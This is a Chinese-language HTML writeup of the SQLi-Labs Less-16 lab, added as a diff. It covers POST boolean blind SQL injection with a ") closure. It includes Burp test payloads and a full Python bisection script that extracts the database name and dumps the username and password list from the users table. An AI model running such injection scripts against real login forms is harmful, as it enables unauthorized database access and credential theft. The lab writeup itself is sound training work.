@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-16 POST型双引号盲注与脚本复用 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-16 POST型双引号盲注与脚本复用 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.24 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, POST注入, 布尔盲注, Python自动化</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-16 (POST - Blind - Boolian/time Based - Double quotes - String)</li>
+        <li><strong>提示：</strong>POST请求，布尔盲注，双引号+括号闭合</li>
+    </ul>
+
+    <h2>2. 解题思路与前置原理</h2>
+    <p>本关卡为 POST 登录框，无报错回显。成功登录返回 <code>flag.jpg</code>，失败返回无图或其它标识。核心考点在于<b>闭合符的探测</b>与<b>盲注脚本的复用</b>。</p>
+    <p>通过 Burp 测试单引号 <code>'</code> 和双引号 <code>"</code> 均无法成功闭合，最终测试出 <code>")</code> 可以完美闭合，推断后台语句为 <code>username=("$uname")</code>。随后复用 L15 的二分法脚本，仅修改 URL 与闭合符即可。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：Burp 抓包测试闭合符</strong></p>
+    <p>在 Repeater 中发送不同闭合符的请求：</p>
+    <ul>
+        <li>输入 <code>uname=admin' #&passwd=123&submit=Submit</code>，页面失败。</li>
+        <li>输入 <code>uname=admin" #&passwd=123&submit=Submit</code>，页面失败。</li>
+        <li>输入 <code>uname=admin") #&passwd=123&submit=Submit</code>，页面成功，弹出 <code>SUCCESSFUL</code>。</li>
+    </ul>
+    <p>确认闭合方式为 <code>")</code>。</p>
+
+    <p><strong>第二步：验证布尔盲注逻辑</strong></p>
+    <p>构造真/假条件进行验证：</p>
+    <ul>
+        <li><code>uname=admin") AND 1=1 #&passwd=123&submit=Submit</code> （成功）</li>
+        <li><code>uname=admin") AND 1=2 #&passwd=123&submit=Submit</code> （失败）</li>
+    </ul>
+
+    <p><strong>第三步：修改 Python 盲注脚本</strong></p>
+    <p>复用 L15 的二分法脚本，修改两处代码：</p>
+    <ol>
+        <li>修改 <code>url</code> 为 Less-16 的地址。</li>
+        <li>修改 <code>is_true</code> 函数中的 Payload 构造。此处必须使用外层单引号包裹 f-string，内层使用双引号加括号 <code>")</code>。</li>
+    </ol>
+
+<pre><code>import requests
+
+url = "http://localhost/sqli-labs-master/Less-16/"
+success_mark = "flag.jpg"
+
+def is_true(cond):
+    # 重点：Python 字符串拼接防止引号冲突
+    data = {
+        "uname": f'admin") AND ({cond}) #', 
+        "passwd": "123456",
+        "submit": "Submit",
+    }
+    try:
+        response = requests.post(url, data=data, timeout=5)
+        return success_mark in response.text
+    except Exception as e:
+        print(f"[-] 请求失败: {e}")
+        return False
+
+def bisect(expr, low, high):
+    while low &lt;= high:
+        mid = (low + high) // 2
+        if is_true(f"{expr}&gt;{mid}"):
+            low = mid + 1
+        else:
+            high = mid - 1
+    return low
+
+def extract(sql):
+    n = bisect(f"length(({sql}))", 0, 100)
+    if n == 0:
+        return ""
+        
+    result = ""
+    for i in range(1, n + 1):
+        ascii_code = bisect(f"ascii(substr(({sql}),{i},1))", 32, 126)
+        if ascii_code == 0 or ascii_code &gt; 126:
+            break
+        char = chr(ascii_code)
+        result += char
+        print(f"[+] 发现第 {i}/{n} 个字符: {char}，当前结果: {result}")
+    return result
+
+def main():
+    print("[*] 开始 POST 布尔盲注 (Less-16)...")
+    db_name = extract("select database()")
+    print(f"[*] 数据库名提取完成: {db_name}")
+    
+    users_data = extract("select group_concat(username,0x3a,password) from security.users")
+    print(f"\n[*] 账号密码提取完成:\n{users_data}")
+
+if __name__ == "__main__":
+    main()</code></pre>
+
+    <p><strong>代码成分解析：</strong></p>
+    <ul>
+        <li><code>data</code> 字典：将闭合符 <code>")</code>、逻辑判断条件以及注释符 <code>#</code> 组合发送。</li>
+        <li><code>success_mark = "flag.jpg"</code>：基于底层源码特征进行判定，避免前端渲染导致的误判。</li>
+        <li><b>引号嵌套坑</b>：<code>f'admin") AND ({cond}) #'</code>。若外层使用双引号，会导致 Python 语法错误，因此外层必须使用单引号。</li>
+    </ul>
+
+    <p><strong>第四步：执行结果</strong></p>
+    <p>运行脚本，终端成功打印出库名 <code>security</code>，随后吐出大量账号密码：<code>Dumb:Dumb,Angelina:I-kill-you...superman:genious,batman:m</code>。受限于长度，部分长密码被截断，但证明漏洞利用完全成功。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>闭合符探测：</strong>盲注没有报错信息，必须通过尝试 <code>'</code>、<code>"</code>、<code>')</code>、<code>")</code> 逐步确定。</li>
+        <li><strong>引号嵌套问题：</strong>Python 中拼接含有双引号的 SQL 语句时，外层 f-string 必须改用单引号，否则会引发 <code>SyntaxError</code>。</li>
+        <li><strong>长短数据截断：</strong>当提取的数据极长时，可能由于 <code>group_concat</code> 的默认长度限制或脚本内的界限设置导致截断，实战中可通过调整 <code>group_concat_max_len</code> 或分批次提取解决。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>盲注脚本的高复用性：</strong>面对不同关卡，只需调整 <code>url</code>、<code>data</code> 结构、闭合符和 <code>success_mark</code> 即可快速打通。</li>
+        <li><strong>底层判定：</strong>使用文件后缀名（如 <code>flag.jpg</code>）作为判定特征，比依赖前端渲染文字更准确。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
